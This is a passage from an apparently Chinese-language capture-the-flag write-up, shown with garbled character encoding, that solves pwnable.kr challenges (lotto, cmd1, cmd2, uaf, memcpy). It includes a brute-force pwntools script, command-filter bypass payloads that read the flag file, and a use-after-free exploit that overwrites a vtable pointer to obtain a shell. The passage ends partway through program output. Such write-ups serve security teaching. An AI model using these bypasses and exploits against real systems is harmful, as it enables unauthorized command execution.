printf(&quot;<span class="exturl" data-url="aHR0cDovL3d3dy5ubG90dG8uY28ua3IvY291bnNlbC5kbz9tZXRob2Q9cGxheWVyR3VpZGUjYnV5aW5nX2d1aWRlMDElNUNuJTVDbg==">http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n</span>&quot;);<br />
printf(&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;);<br />
}</p>
<p>int main(int argc, char* argv[]){</p>
<pre><code>// menu
unsigned int menu;

while(1)&#123;

	printf(&quot;- Select Menu -\n&quot;);
	printf(&quot;1. Play Lotto\n&quot;);
	printf(&quot;2. Help\n&quot;);
	printf(&quot;3. Exit\n&quot;);

	scanf(&quot;%d&quot;, &amp;menu);

	switch(menu)&#123;
		case 1:
			play();
			break;
		case 2:
			help();
			break;
		case 3:
			printf(&quot;bye\n&quot;);
			return 0;
		default:
			printf(&quot;invalid menu\n&quot;);
			break;
	&#125;
&#125;
return 0;
</code></pre>
<p>}</p>
<h3 id="é¢˜ç›®è§£æ-13"><a class="anchor" href="#é¢˜ç›®è§£æ-13">#</a> é¢˜ç›®è§£æ</h3>
<p>ç¨‹åºä» <code>/dev/urandom</code>  ä¸­è¯»å– 6 ä¸ªå­—èŠ‚éšæœºæ•°ï¼Œä¸ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œå¯¹æ¯”ï¼Œè€Œé—®é¢˜å°±å‡ºåœ¨å¯¹æ¯”çš„åœ°æ–¹</p>
<pre><code>for(i=0; i&lt;6; i++)&#123;
	for(j=0; j&lt;6; j++)&#123;
		if(lotto[i] == submit[j])&#123;
			match++;
		&#125;
	&#125;
&#125;
</code></pre>
<p>ç¨‹åºå†™æˆäº†åµŒå¥—å¾ªç¯ï¼Œç»“æœå¯¼è‡´åªè¦æœ‰ä¸€æ¬¡ lotto [i]==submit [j]ï¼Œmatch++ å°±å¯ä»¥åŠ åˆ° 6ï¼Œæœ€åå¾—åˆ° flagã€‚é‚£ä¹ˆå°±éšä¾¿æŒ‘ä¸ªå­—ç¬¦ï¼Œç„¶åçˆ†ç ´å°±è¡Œäº†ã€‚</p>
<p>from pwn import *</p>
<p>s=ssh(&quot;lotto&quot;,&quot;<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>&quot;,2222,&quot;guest&quot;)<br />
p=s.process(&quot;/home/lotto/lotto&quot;)<br />
p.recv()<br />
while True:<br />
p.sendline(&quot;1&quot;)<br />
p.recv()<br />
payload=&quot;------&quot;<br />
p.sendline(payload)<br />
recv_str=p.recv()<br />
if &quot;bad luck...\n&quot; not in recv_str:<br />
print recv_str<br />
break</p>
<h2 id="cmd1"><a class="anchor" href="#cmd1">#</a> cmd1</h2>
<h3 id="é¢˜ç›®æè¿°-14"><a class="anchor" href="#é¢˜ç›®æè¿°-14">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;string.h&gt;</p>
<p>int filter(char* cmd){<br />
int r=0;<br />
r += strstr(cmd, &quot;flag&quot;)!=0;<br />
r += strstr(cmd, &quot;sh&quot;)!=0;<br />
r += strstr(cmd, &quot;tmp&quot;)!=0;<br />
return r;<br />
}<br />
int main(int argc, char* argv[], char** envp){<br />
putenv(&quot;PATH=/thankyouverymuch&quot;);<br />
if(filter(argv[1])) return 0;<br />
system( argv[1] );<br />
return 0;<br />
}</p>
<h3 id="é¢˜ç›®è§£æ-14"><a class="anchor" href="#é¢˜ç›®è§£æ-14">#</a> é¢˜ç›®è§£æ</h3>
<p>ç¨‹åºæ‰§è¡Œç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ï¼Œä½†æ˜¯è®¾ç½®äº†ä¸€ä¸ªä¸å­˜åœ¨çš„ path ç¯å¢ƒå˜é‡ <code>/thankyouverymuch</code> ï¼Œå¹¶ä¸”å¯¹è¾“å…¥è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½è¾“å…¥ shï¼Œflagï¼Œtmpã€‚</p>
<p>ç¯å¢ƒå˜é‡éƒ¨åˆ†åªéœ€è¦å¸¦ä¸Šè·¯å¾„è®¿é—®å°±å¯ä»¥ï¼Œè¿‡æ»¤éƒ¨åˆ†åˆ™éœ€è¦åˆ©ç”¨ linux çš„é€šé…ç¬¦ï¼Œæˆ–è€…å¯ä»¥å°† &quot;flag&quot; æ‹†åˆ†å¼€</p>
<p>payloadï¼š</p>
<p><code>./cmd1 &quot;/bin/cat fl*&quot;</code></p>
<p>æˆ–è€…</p>
<p><code>./cmd1 â€œ/bin/cat \â€f\â€\â€l\â€\â€a\â€\â€g\â€â€</code></p>
<h2 id="cmd2"><a class="anchor" href="#cmd2">#</a> cmd2</h2>
<h3 id="é¢˜ç›®æè¿°-15"><a class="anchor" href="#é¢˜ç›®æè¿°-15">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;string.h&gt;</p>
<p>int filter(char* cmd){<br />
int r=0;<br />
r += strstr(cmd, &quot;=&quot;)!=0;<br />
r += strstr(cmd, &quot;PATH&quot;)!=0;<br />
r += strstr(cmd, &quot;export&quot;)!=0;<br />
r += strstr(cmd, &quot;/&quot;)!=0;<br />
r += strstr(cmd, &quot;`&quot;)!=0;<br />
r += strstr(cmd, &quot;flag&quot;)!=0;<br />
return r;<br />
}</p>
<p>extern char** environ;<br />
void delete_env(){<br />
char** p;<br />
for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));<br />
}</p>
<p>int main(int argc, char* argv[], char** envp){<br />
delete_env();<br />
putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;);<br />
if(filter(argv[1])) return 0;<br />
printf(&quot;%s\n&quot;, argv[1]);<br />
system( argv[1] );<br />
return 0;<br />
}</p>
<h3 id="é¢˜ç›®è§£æ-15"><a class="anchor" href="#é¢˜ç›®è§£æ-15">#</a> é¢˜ç›®è§£æ</h3>
<p>æ¯”èµ·ä¸Šä¸€é“é¢˜ç›®éš¾äº†è®¸å¤šï¼Œæœ€éº»çƒ¦çš„å°±æ˜¯è¿‡æ»¤äº† /ï¼Œä¸èƒ½å† <code>/bin/cat fl*</code> ï¼Œå½“ç„¶è¿˜æ˜¯æœ‰åŠæ³•ç»•è¿‡ã€‚</p>
<ul>
<li><strong>pwd æ–¹å¼</strong><br />
è™½ç„¶å› ä¸ºç¨‹åºè®¾ç½®äº† PATH å¯¼è‡´æ— æ³•æ‰§è¡Œå¾ˆå¤šå‘½ä»¤ï¼Œä½†æ˜¯å‘ç°å¯ä»¥æ‰§è¡Œ pwdï¼Œæœ‰ä¸¤ç§æ–¹æ³•</li>
</ul>
<ol>
<li>è¿›å…¥åˆ°æ ¹ç›®å½• <code>/</code> , æ­¤æ—¶ pwd è¿”å›çš„ç»“æœå°±æ˜¯ <code>/</code> ï¼Œåˆ©ç”¨ <code>$(pwd)</code>  å°±å¯ä»¥å¾—åˆ° <code>/</code>  æ¥ç€æ„é€  payloadï¼š<br />
 <code>/home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*'</code></li>
<li>é¦–å…ˆåœ¨ tmp ç›®å½•ä¸‹åˆ›å»ºç›®å½• <code>/tmp/test/c</code> ï¼Œè¿™æ ·åœ¨æ­¤ç›®å½•ä¸‹æ‰§è¡Œ pwd ä¼šå¾—åˆ° <code>/tmp/test/c</code> ï¼Œæ¥ç€åœ¨ <code>/tmp/test</code>  ç›®å½•ä¸‹å»ºç«‹ cat çš„è½¯è¿æ¥ï¼š <code>ln -s /bin/cat cat</code> ï¼Œåœ¨ <code>/tmp/test/c</code>  ä¸‹å»ºç«‹ flag çš„è½¯è¿æ¥ï¼š <code>ln -s /home/cmd2/flag flag</code> ï¼Œç„¶ååœ¨ <code>/tmp/test/c</code>  ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ï¼š <code>/home/cmd2/cmd2 &quot;$(pwd)at f*&quot;</code></li>
</ol>
<ul>
<li>ç¼–ç æ–¹å¼</li>
</ul>
<ol>
<li>BASE64<br />
 é¦–å…ˆå°† <code>/bin/cat /home/cmd2/flag</code>  è¿›è¡Œ base64 ç¼–ç ï¼Œå¾—åˆ° <code>L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnCg==</code> ï¼Œä½†æ˜¯å› ä¸ºæœ‰ =ï¼Œæ‰€ä»¥éœ€è¦åœ¨åŸæ¥çš„å­—ç¬¦ä¸²ä¸­æ’å…¥ä¸¤ä¸ªç©ºæ ¼ï¼Œå°±ä¸ä¼šæœ‰ = äº†ã€‚<br />
 <code>echo &quot;\57&quot;</code>  å¯ä»¥è¾“å‡º <code>/</code> ï¼Œåˆ©ç”¨ç®¡é“ç¬¦è¿›è¡Œè§£ç ï¼Œæœ€åå°±å¯ä»¥å¾—åˆ° flag<br />
 <code>./cmd2 '$(echo &quot;L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnICAK&quot; | $(echo &quot;\57&quot;)usr$(echo &quot;\57&quot;)bin$(echo &quot;\57&quot;)base64 -d)'</code></li>
<li>8 è¿›åˆ¶<br />
ç®—å‡º <code>/bin/cat flag</code> 8 è¿›åˆ¶ä»£ç ï¼Œå¾—åˆ° <code>\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</code> ï¼Œæ¥ç€æ‰§è¡Œ <code>./cmd2 '$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)'</code></li>
</ol>
<ul>
<li>è„‘æ´å¤§å¼€æ–¹å¼</li>
</ul>
<ol>
<li>åˆ©ç”¨ read å†™å…¥ç¯å¢ƒå˜é‡å¹¶æ‰§è¡Œ<br />
æ‰§è¡Œ <code>./cmd2 &quot;read a;\$a&quot;</code> ï¼Œè¾“å…¥ <code>/bin/cat flag</code>  å¾—åˆ° flag<br />
 <code>read a;</code>  å†™å…¥ä¸€ä¸ª a å˜é‡ï¼Œ <code>\$a</code>  è½¬ä¹‰ <code>$</code>  å­—ç¬¦ï¼Œæ‰§è¡Œ <code>$a</code>  å˜é‡ã€‚</li>
<li>shell å†…ç½®å‡½æ•° command çš„å‚æ•° <code>-p</code></li>
</ol>
<p>./cmd2 &quot;command -p cat &quot;f&quot;l&quot;a&quot;g&quot;</p>
<h2 id="uaf"><a class="anchor" href="#uaf">#</a> uaf</h2>
<h3 id="é¢˜ç›®æè¿°-16"><a class="anchor" href="#é¢˜ç›®æè¿°-16">#</a> é¢˜ç›®æè¿°</h3>
<p>Mommy, what is Use After Free bug?</p>
<p>#include &lt;fcntl.h&gt;<br />
#include &lt;iostream&gt;<br />
#include &lt;cstring&gt;<br />
#include &lt;cstdlib&gt;<br />
#include &lt;unistd.h&gt;<br />
using namespace std;</p>
<p>class Human{<br />
private:<br />
virtual void give_shell(){<br />
system(&quot;/bin/sh&quot;);<br />
}<br />
protected:<br />
int age;<br />
string name;<br />
public:<br />
virtual void introduce(){<br />
cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;<br />
cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;<br />
}<br />
};</p>
<p>class Man: public Human{<br />
public:<br />
Man(string name, int age){<br />
this-&gt;name = name;<br />
this-&gt;age = age;<br />
}<br />
virtual void introduce(){<br />
Human::introduce();<br />
cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;<br />
}<br />
};</p>
<p>class Woman: public Human{<br />
public:<br />
Woman(string name, int age){<br />
this-&gt;name = name;<br />
this-&gt;age = age;<br />
}<br />
virtual void introduce(){<br />
Human::introduce();<br />
cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;<br />
}<br />
};</p>
<p>int main(int argc, char* argv[]){<br />
Human* m = new Man(&quot;Jack&quot;, 25);<br />
Human* w = new Woman(&quot;Jill&quot;, 21);</p>
<pre><code>size_t len;
char* data;
unsigned int op;
while(1)&#123;
	cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
	cin &gt;&gt; op;

	switch(op)&#123;
		case 1:
			m-&gt;introduce();
			w-&gt;introduce();
			break;
		case 2:
			len = atoi(argv[1]);
			data = new char[len];
			read(open(argv[2], O_RDONLY), data, len);
			cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;
			break;
		case 3:
			delete m;
			delete w;
			break;
		default:
			break;
	&#125;
&#125;

return 0;	
</code></pre>
<p>}</p>
<h3 id="é¢˜ç›®è§£æ-16"><a class="anchor" href="#é¢˜ç›®è§£æ-16">#</a> é¢˜ç›®è§£æ</h3>
<p>è¿™é“é¢˜ç›®å¾ˆæ˜æ˜¾æ˜¯ Use-After-Free (UAF) æ¼æ´ï¼Œcase3 ä¸­ <code>delete m;delete w</code> ï¼Œä½†æ˜¯ä¹‹åå† case1 ä¸­å¯ä»¥å†è°ƒç”¨ <code>m-&gt;introduce();w-&gt;introduce();</code> ï¼Œè§¦å‘æ¼æ´ã€‚</p>
<p>é¦–å…ˆäº†è§£ä¸‹ C++ è™šå‡½æ•°</p>
<p>è™šå‡½æ•°ï¼Œä¸€æ—¦ä¸€ä¸ªç±»æœ‰è™šå‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šä¸ºè¿™ä¸ªç±»å»ºç«‹ä¸€å¼  vtableã€‚å­ç±»ç»§æ‰¿çˆ¶ç±» vtable ä¸­æ‰€æœ‰é¡¹ï¼Œå½“å­ç±»æœ‰åŒåå‡½æ•°æ—¶ï¼Œä¿®æ”¹ vtable åŒåå‡½æ•°åœ°å€ï¼Œæ”¹ä¸ºæŒ‡å‘å­ç±»çš„å‡½æ•°åœ°å€ï¼Œå­ç±»æœ‰æ–°çš„è™šå‡½æ•°æ—¶ï¼Œåœ¨ vtable ä¸­æ·»åŠ ã€‚ç§æœ‰å‡½æ•°æ— æ³•ç»§æ‰¿ï¼Œä½†å¦‚æœç§æœ‰å‡½æ•°æ˜¯è™šå‡½æ•°ï¼Œvtable ä¸­ä¼šæœ‰ç›¸åº”çš„å‡½æ•°åœ°å€ï¼Œæ‰€æœ‰å­ç±»å¯ä»¥é€šè¿‡æ‰‹æ®µå¾—åˆ°çˆ¶ç±»çš„è™šç§æœ‰å‡½æ•°ã€‚</p>
<p>è°ƒè¯•å¾—åˆ° <code>give_shell</code>  åœ°å€åå°±éœ€è¦æƒ³åŠæ³•è°ƒç”¨ï¼Œè¿™é‡Œå°±åˆ©ç”¨åˆ° UAF</p>
<p>ä½†æ˜¯åˆ©ç”¨ä¹‹å‰éœ€è¦æ§åˆ¶è¢«é‡Šæ”¾çš„ç©ºé—´é‡Œçš„å†…å®¹ï¼Œcase2 ä¸­æœ‰ read å‡½æ•°å¯ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯å¹¶ä¸èƒ½æ§åˆ¶å†™å¾€ä»€ä¹ˆåœ°å€ã€‚è¿™é‡Œå°±éœ€è¦äº†è§£ä¸‹<a target="_blank" rel="noopener" href="https://www.freebuf.com/news/88660.html"><strong> fastbin</strong></a></p>
<p>fastbin é¡¾åæ€ä¹‰ï¼Œfast å°±æ˜¯è¦å¿«ã€‚æ‰€ä»¥ fastbin æ—¨åœ¨åŠ å¿«æ“ä½œç³»ç»Ÿçš„å†…å­˜åˆ†é…é€Ÿåº¦ï¼Œfastbin ä»…ä½¿ç”¨ fd å½¢æˆå•é“¾è¡¨çš„å½¢å¼ï¼Œä¸”éµå¾ª LIFO åŸåˆ™ã€‚</p>
<p>å½“æ“ä½œç³»ç»Ÿåˆ†é…ä¸€å—è¾ƒå°çš„å†…å­˜æ—¶ (64 å­—èŠ‚)ï¼Œä¼šé¦–å…ˆä»ä» fastbin ä¸­å¯»æ‰¾æœªä½¿ç”¨çš„ chunk å¹¶åˆ†é…ã€‚</p>
<p>wï¼Œm å¯¹è±¡çš„å†…å­˜å¸ƒå±€ä¸º</p>
<p>+------------+<br />
|   vtable   |&lt;----------------+<br />
+------------+                 |<br />
|    age     |        +------------------+<br />
+------------+        | human::give_shell|<br />
|    name    |        +------------------+<br />
+------------+        |  man::introduce  |<br />
^               +------------------+<br />
|<br />
+------------+<br />
|   &quot;jack&quot;   |<br />
+------------+</p>
<p>å¤§å°ä¸º 24 å­—èŠ‚ï¼Œå±äº fastbinã€‚æ‰§è¡Œ delete ä¹‹åï¼Œå¦‚æœ case2 ä¸­åˆ†é…çš„ç©ºé—´å¤§å°ä¸º 24 å­—èŠ‚ï¼Œå°±å¯ä»¥é‡æ–°åˆ†é…åˆ°è¿™ä¸€å—å†…å­˜åŒºåŸŸã€‚</p>
<p><strong>payload</strong></p>
<p>uaf@prowl:~$ python -c 'print &quot;\x48\x15\x40\x00\x00\x00\x00\x00&quot;'&gt;/tmp/uaf_exp1<br />
uaf@prowl:~$ ./uaf 24 /tmp/uaf_exp1</p>
<ol>
<li>use</li>
<li>after</li>
<li>free<br />
3</li>
<li>use</li>
<li>after</li>
<li>free<br />
2<br />
your data is allocated</li>
<li>use</li>
<li>after</li>
<li>free<br />
2          #åˆ†é…ä¸¤æ¬¡ï¼Œå› ä¸ºç¨‹åºå…ˆ delete m, å delete wï¼Œåªåˆ†é…ä¸€æ¬¡ä¼šå…ˆåˆ†é…åˆ° w ä¸Šé¢ï¼Œè€Œ case1 æ˜¯å…ˆæ‰§è¡Œ m-&gt;introduce ()ã€‚<br />
your data is allocated</li>
<li>use</li>
<li>after</li>
<li>free<br />
1<br />
$ ls<br />
flag  uaf  uaf.cpp<br />
$ cat flag<br />
yay_f1ag_aft3r_pwning</li>
</ol>
<h2 id="memcpy"><a class="anchor" href="#memcpy">#</a> memcpy</h2>
<h3 id="é¢˜ç›®æè¿°-17"><a class="anchor" href="#é¢˜ç›®æè¿°-17">#</a> é¢˜ç›®æè¿°</h3>
<p>// compiled with:gcc -o memcpy memcpy.c -m32 -lm<br />
#include &lt;stdio.h&gt;<br />
#include &lt;string.h&gt;<br />
#include &lt;stdlib.h&gt;<br />
#include &lt;signal.h&gt;<br />
#include &lt;unistd.h&gt;<br />
#include &lt;sys/mman.h&gt;<br />
#include &lt;math.h&gt;</p>
<p>unsigned long long rdtsc(){<br />
asm(&quot;rdtsc&quot;);<br />
}</p>
<p>char* slow_memcpy(char* dest, const char* src, size_t len){<br />
int i;<br />
for (i=0; i&lt;len; i++) {<br />
dest[i] = src[i];<br />
}<br />
return dest;<br />
}</p>
<p>char* fast_memcpy(char* dest, const char* src, size_t len){<br />
size_t i;<br />
// 64-byte block fast copy<br />
if(len &gt;= 64){<br />
i = len / 64;<br />
len &amp;= (64-1);<br />
while(i-- &gt; 0){<br />
<strong>asm</strong> <strong>volatile</strong> (<br />
&quot;movdqa (%0), %%xmm0\n&quot;<br />
&quot;movdqa 16(%0), %%xmm1\n&quot;<br />
&quot;movdqa 32(%0), %%xmm2\n&quot;<br />
&quot;movdqa 48(%0), %%xmm3\n&quot;<br />
&quot;movntps %%xmm0, (%1)\n&quot;<br />
&quot;movntps %%xmm1, 16(%1)\n&quot;<br />
&quot;movntps %%xmm2, 32(%1)\n&quot;<br />
&quot;movntps %%xmm3, 48(%1)\n&quot;<br />
::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;);<br />
dest += 64;<br />
src += 64;<br />
}<br />
}</p>
<pre><code>// byte-to-byte slow copy
if(len) slow_memcpy(dest, src, len);
return dest;
</code></pre>
<p>}</p>
<p>int main(void){</p>
<pre><code>setvbuf(stdout, 0, _IONBF, 0);
setvbuf(stdin, 0, _IOLBF, 0);

printf(&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;);
printf(&quot;The assignment is simple.\n&quot;);

printf(&quot;-----------------------------------------------------\n&quot;);
printf(&quot;- What is the best implementation of memcpy?        -\n&quot;);
printf(&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;);
printf(&quot;- 2. compare them with various size of data         -\n&quot;);
printf(&quot;- 3. conclude your experiment and submit report     -\n&quot;);
printf(&quot;-----------------------------------------------------\n&quot;);

printf(&quot;This time, just help me out with my experiment and get flag\n&quot;);
printf(&quot;No fancy hacking, I promise :D\n&quot;);

unsigned long long t1, t2;
int e;
char* src;
char* dest;
unsigned int low, high;
unsigned int size;
// allocate memory
char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

size_t sizes[10];
int i=0;

// setup experiment parameters
for(e=4; e&lt;14; e++)&#123;	// 2^13 = 8K
	low = pow(2,e-1);
	high = pow(2,e);
	printf(&quot;specify the memcpy amount between %d ~ %d:&quot;, low, high);
	scanf(&quot;%d&quot;, &amp;size);
	if( size &lt; low || size &gt; high )&#123;
		printf(&quot;don't mess with the experiment.\n&quot;);
		exit(0);
	&#125;
	sizes[i++] = size;
&#125;

sleep(1);
printf(&quot;ok, lets run the experiment with your configuration\n&quot;);
sleep(1);

// run experiment
for(i=0; i&lt;10; i++)&#123;
	size = sizes[i];
	printf(&quot;experiment %d:memcpy with buffer size %d\n&quot;, i+1, size);
	dest = malloc( size );

	memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
	t1 = rdtsc();
	slow_memcpy(dest, src, size);		// byte-to-byte memcpy
	t2 = rdtsc();
	printf(&quot;ellapsed CPU cycles for slow_memcpy:%llu\n&quot;, t2-t1);

	memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
	t1 = rdtsc();
	fast_memcpy(dest, src, size);		// block-to-block memcpy
	t2 = rdtsc();
	printf(&quot;ellapsed CPU cycles for fast_memcpy:%llu\n&quot;, t2-t1);
	printf(&quot;\n&quot;);
&#125;

printf(&quot;thanks for helping my experiment!\n&quot;);
printf(&quot;flag:----- erased in this source code -----\n&quot;);
return 0;
</code></pre>
<p>}</p>
<h3 id="é¢˜ç›®è§£æ-17"><a class="anchor" href="#é¢˜ç›®è§£æ-17">#</a> é¢˜ç›®è§£æ</h3>
<p>è¿™ä¸ªç¨‹åºçš„ä½œç”¨å°±æ˜¯æµ‹è¯•è‡ªå·±å®ç°çš„ä¸¤ä¸ªå‡½æ•° <code>slow_memcpy</code>  å’Œ <code>fast_memcpy</code>  çš„é€Ÿåº¦ï¼Œ <code>slow_memcpy</code>  ä½¿ç”¨çš„æ˜¯é€å­—èŠ‚èµ‹å€¼ï¼Œ <code>fast_memcpy</code>  å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œä½¿ç”¨çš„æ˜¯å†…åµŒæ±‡ç¼– <code>movdqa</code>  å’Œ <code>movntps</code>  æŒ‡ä»¤ï¼Œå½“ç¨‹åºæµ‹è¯•å®Œä¹‹åå°±ä¼šç›´æ¥è¾“å‡º flagã€‚</p>
<p>ç›´æ¥è¿è¡Œç¨‹åºï¼Œ</p>
<p>specify the memcpy amount between 8 ~ 16:8<br />
specify the memcpy amount between 16 ~ 32:16<br />
specify the memcpy amount between 32 ~ 64:32<br />
specify the memcpy amount between 64 ~ 128:64<br />
specify the memcpy amount between 128 ~ 256:128<br />
specify the memcpy amount between 256 ~ 512:256<br />
specify the memcpy amount between 512 ~ 1024:512<br />
specify the memcpy amount between 1024 ~ 2048:1024<br />
specify the memcpy amount between 2048 ~ 4096:2048<br />
specify the memcpy amount between 4096 ~ 8192:4096<br />
ok, lets run the experiment with your configuration<br />
experiment 1:memcpy with buffer size 8<br />
ellapsed CPU cycles for slow_memcpy:2162<br />
ellapsed CPU cycles for fast_memcpy:244</p>
<p>experiment 2:memcpy with buffer size 16<br />
ellapsed CPU cycles for slow_memcpy:358<br />
ellapsed CPU cycles for fast_memcpy:254</p>
<p>experiment 3:memcpy with buffer size 32<br />
ellapsed CPU cycles for slow_memcpy:382<br />
ellapsed CPU cycles for fast_memcpy:484</p>
<p>experiment 4:memcpy with buffer size 64<br />
ellapsed CPU cycles for slow_memcpy:618<br />
ellapsed CPU cycles for fast_memcpy:168</p>
<p>experiment 5:memcpy with buffer size 128<br />
ellapsed CPU cycles for slow_memcpy:1250</p>
<p>å¹¶æ²¡æœ‰è¾“å‡º flagï¼Œè€Œæ˜¯åˆ°æŸä¸€ä¸ªç¯èŠ‚å°±åœä¸‹æ¥äº†ï¼Œä½¿ç”¨ ida è°ƒè¯•ä¸‹ï¼Œç¨‹åºåœ¨ <code>_mm_stream_ps(a1, (__m128)_mm_load_si128(a2));</code> ï¼Œä¹Ÿå°±æ˜¯ <code>&quot;movntps %%xmm0, (%1)\n&quot;</code>  çš„åœ°æ–¹å‡ºé”™äº†ï¼ŒæŸ¥äº†ä¸‹ <code>movntps</code> ï¼Œå…¶ä¸­æœ‰ä¸€å¥æè¿°ï¼š</p>
<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) will be generated.</p>
<p>â€œå¦‚æœæºæˆ–ç›®çš„æ“ä½œæ•°æ˜¯ä¸€ä¸ªå†…å­˜å¼•ç”¨ï¼Œåˆ™å®ƒå¿…é¡»æ»¡è¶³ 16 å­—èŠ‚å¯¹é½ã€‚å¦åˆ™ï¼Œä¼šé€ æˆä¸€èˆ¬ä¿æŠ¤é”™è¯¯ã€‚â€</p>
<p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå‰ä¸‰æ¬¡çš„èµ‹å€¼æ“ä½œå…¶å®éƒ½æ˜¯ç”± <code>slow_memcpy</code>  æ¥å®Œæˆçš„ï¼Œæ‰€ä»¥æ²¡æœ‰å‡ºé—®é¢˜ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆåé¢çš„å­—èŠ‚å°±æ— æ³•å¯¹é½</p>
<p>é¦–å…ˆ src æ˜¯é€šè¿‡ <code>mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</code>  æ¥å¾—åˆ°åœ°å€çš„ï¼Œè¿™ä¸ªåœ°å€ä¸€å®šæ˜¯ 16 å­—èŠ‚å¯¹é½çš„ï¼ˆ<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDIyNTk0OTUvZG9lcy1tbWFwLXJldHVybi1hbGlnbmVkLXBvaW50ZXItdmFsdWVz">åŸå› </span>ï¼‰ã€‚è€Œ dest åˆ™æ˜¯ç”± malloc æ¥åˆ†é…çš„åœ°å€ï¼Œå¹¶ä¸” malloc è¿”å›çš„åœ°å€æ€»æ˜¯ 8 å­—èŠ‚å¯¹é½ï¼Œæ‰€ä»¥å°±æœ‰å¯èƒ½å¯¼è‡´åœ°å€ä¸æ˜¯ 16 å­—èŠ‚å¯¹é½ã€‚</p>
<p>ä½†æ˜¯è¾“å…¥çš„æ•°æ®ä¸º 128 æ—¶ï¼Œä½†æ˜¯ç¨‹åºè¿˜æ˜¯å´©æºƒäº†</p>
<p>åŸå› åœ¨äºå †ä¸Šåˆ†é…ç©ºé—´æ—¶ï¼Œé™¤äº†ç”¨æˆ·çš„æ•°æ®ï¼Œè¿˜æœ‰ 4 å­—èŠ‚çš„ chunk ä¿¡æ¯ï¼Œå†åŠ ä¸Š malloc çš„ 8 å­—èŠ‚å¯¹é½ï¼Œæ‰€ä»¥å°±æ— æ³• 16 å­—èŠ‚å¯¹é½ã€‚</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥è¾“å…¥çš„æ•°æ®åªéœ€è¦åŠ ä¸Š 8 æˆ–è€… 12 å°±å¯ä»¥æ»¡è¶³ 16 å­—èŠ‚å¯¹é½ã€‚</p>
<h2 id="memcpyprowl~-nc-0-9022hey-i-have-a-boring-assignment-for-cs-class-the-assignment-is-simple"><a class="anchor" href="#memcpyprowl~-nc-0-9022hey-i-have-a-boring-assignment-for-cs-class-the-assignment-is-simple">#</a> memcpy@prowl:~$ nc 0 9022<br />
Hey, I have a boring assignment for CS class.. ğŸ˜¦<br />
The assignment is simple.</h2>
<ul>
<li>What is the best implementation of memcpy?        -</li>
<li>
<ol>
<li>implement your own slow/fast version of memcpy -</li>
</ol>
</li>
<li>
<ol start="2">
<li>compare them with various size of data         -</li>
</ol>
</li>
<li>
<ol start="3">
<li>conclude your experiment and submit report     -</li>
</ol>
</li>
</ul>
<hr />
<p>This time, just help me out with my experiment and get flag<br />
No fancy hacking, I promise ğŸ˜„<br />
specify the memcpy amount between 8 ~ 16:8<br />
specify the memcpy amount between 16 ~ 32:16<br />
specify the memcpy amount between 32 ~ 64:32<br />
specify the memcpy amount between 64 ~ 128:72<br />
specify the memcpy amount between 128 ~ 256:136<br />
specify the memcpy amount between 256 ~ 512:264<br />
specify the memcpy amount between 512 ~ 1024:520<br />
specify the memcpy amount between 1024 ~ 2048:1032<br />
specify the memcpy amount between 2048 ~ 4096:2056<br />
specify the memcpy amount between 4096 ~ 8192:4104<br />
ok, lets run the experiment with your configuration<br />
experiment 1:memcpy with buffer size 8<br />
ellapsed CPU cycles for slow_memcpy:2120<br />
ellapsed CPU cycles for fast_memcpy:170</p>
<p>experiment 2:memcpy with buffer size 16<br />
ellapsed CPU cycles for slow_memcpy:234<br />
ellapsed CPU cycles for fast_memcpy:208</p>
<p>experiment 3:memcpy with buffer size 32<br />
ellapsed CPU cycles for slow_memcpy:438<br />
ellapsed CPU cycles for fast_memcpy:340</p>
<p>experiment 4:memcpy with buffer size 72<br />
ellapsed CPU cycles for slow_memcpy:600<br />
ellapsed CPU cycles for fast_memcpy:212</p>
<p>experiment 5:memcpy with buffer size 136<br />
ellapsed CPU cycles for slow_memcpy:1208<br />
ellapsed CPU cycles for fast_memcpy:136</p>
<p>experiment 6:memcpy with buffer size 264<br />
